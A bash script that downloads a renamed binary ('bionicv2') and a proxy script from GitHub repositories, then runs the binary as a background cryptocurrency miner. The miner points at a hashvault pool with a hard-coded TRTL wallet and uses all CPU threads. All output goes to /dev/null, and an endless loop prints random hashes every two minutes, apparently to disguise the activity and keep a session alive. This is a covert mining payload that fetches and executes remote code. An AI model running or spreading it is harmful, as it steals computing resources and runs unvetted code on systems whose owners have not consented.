#!/bin/bash
apt update
apt -y install wget curl python3 libjansson4
wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/scala/main/xla
wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
chmod +x bionicv2 proxy.py
python3 proxy.py >/dev/null &
pool="pool.hashvault.pro:80"
wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
proxy="socks5://174.138.17.79:4145"
./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
